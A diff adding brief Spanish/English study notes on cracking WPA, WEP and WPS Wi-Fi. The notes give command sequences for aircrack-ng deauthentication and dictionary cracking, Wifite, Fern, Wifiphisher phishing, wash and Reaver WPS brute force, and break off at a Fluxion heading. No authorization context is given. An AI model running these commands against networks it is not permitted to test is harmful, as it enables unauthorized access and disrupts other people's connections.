@@ -1,0 +1,58 @@
+FULL COURSE WPA/WEP/WPS
+_______________________
+
+1) Aircrack
+
+   >> airmon-ng start wlan0
+
+   >> airodump wlan0mon
+
+   >> airodump-ng --bssid <BSSID> -c <canal>  -w <rutaDelArchivo.cap?> wlan0mon
+
+   >> aireplay-ng --deauth 10 -a <MAC> wlan0mon
+
+   >> aircrack-ng -w <Diccionario> -b <MAC> <archivo.cap>
+
+2) Fern Wifi cracker --> Automation of the previous method
+
+   --> Seleccionar interfaz
+   --> Proporcionar diccionario
+   --> Elegir punto de acceso y demás
+
+3) Wifite: para wep en pocos minutos
+
+   >> wifite --wep
+
+   >> Seleccionar AP
+
+   Lo hace solo (buscar vectores de inicializacion)
+
+4) Fern Wifi para wep --> Muy directo
+
+5) Wifi phiser
+
+   >> wifiphiser
+
+   >> Opcion 1 del browser
+
+   Lo hace solo
+
+6) Wash
+
+   - Es para WPS
+
+   >> airmon-ng wlan0 start
+
+   >> wash -i wlan0mon -C
+
+   >> Solo para saber si WPS esta
+
+7) Reaver: WPA con WPS
+
+   >> POner a la tarjeta a capturar cosas
+
+   >> reaver -i wlan0mon -b <BSSID> -vv
+
+8) Fluxion
+
+   
